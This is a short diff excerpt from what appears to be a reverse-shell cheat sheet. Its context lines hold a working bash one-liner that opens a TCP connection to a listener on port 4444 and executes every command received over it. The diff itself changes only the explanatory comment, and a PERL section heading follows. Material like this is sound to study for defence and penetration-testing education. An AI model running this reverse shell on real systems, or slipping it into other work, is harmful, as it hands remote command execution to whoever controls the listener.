@@ -24,7 +24,7 @@ Or using some bash-skillz -
 	exec 5<>/dev/tcp/127.0.0.1/4444
 	cat <&5 | while read line; do $line 2>&5 >&5; done
 
-Creates an FD (File descriptor) 5 and does a bunch of piping-fu
+Creates an FD (File descriptor) 5 and does a bunch of piping-fu; connects back to 4444
 ### 3. PERL  
 Good ol' PERL, nearly every system has it and is a cornerstone of utility -  
 	
